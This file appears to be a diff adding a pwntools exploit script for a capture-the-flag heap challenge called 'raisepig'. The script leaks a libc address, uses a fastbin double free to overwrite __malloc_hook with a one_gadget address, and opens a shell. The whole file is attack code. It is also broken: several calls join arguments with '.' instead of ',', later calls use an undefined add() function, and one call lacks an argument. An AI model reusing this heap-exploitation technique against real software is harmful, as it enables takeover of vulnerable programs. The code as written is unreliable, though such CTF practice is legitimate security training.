@@ -1,0 +1,59 @@
+from pwn import *
+
+r=process("./raisepig")
+print util.proc.pidof(r)
+
+def alloc(length,name,pty):
+	r.recvuntil("Your choice : ")
+	r.sendline("1")
+	r.recvuntil("Length of the name :")
+	r.sendline(str(length))
+	r.recvuntil("The name of pig :")
+	r.sendline(name)
+	r.recvuntil("The type of the pig :")
+	r.sendline(pty)
+
+def show():
+	r.recvuntil("Your choice : ")
+	r.sendline("2")
+
+def eat(idd):
+	r.recvuntil("Your choice : ")
+	r.sendline("3")
+	r.recvuntil("Which pig do you want to eat:")
+	r.sendline(str(idd))
+
+alloc(0x80,"aaaa","aa")
+alloc(0x20,'bbbb',"bb")
+eat(0)
+alloc(0x50,'',"cc")
+show()
+r.recvuntil("Name[2] :")
+data = u64(r.recv(6).ljust(8,'\x00'))
+print hex(data)
+
+libc = data - 0x3c4b0a
+one = libc + 0x45216
+malloc_addr = libc + 0x3c4b10
+
+alloc(0x60,"cccc"."cc")
+alloc(0x60,"dddd"."dd")
+alloc(0x60,"eeee"."ee")
+
+eat(3)
+eat(4)
+eat(3)
+
+add(0x60,p64(malloc_addr - 0x13))
+add(0x60,"gggg","gg")
+add(0x60,"ffff","ff")
+
+add(0x60,'\x00\x00\x00'+p64(one),"ii")
+eat(0)
+eat(0)
+
+r.interactive()
+
+
+
+pause()
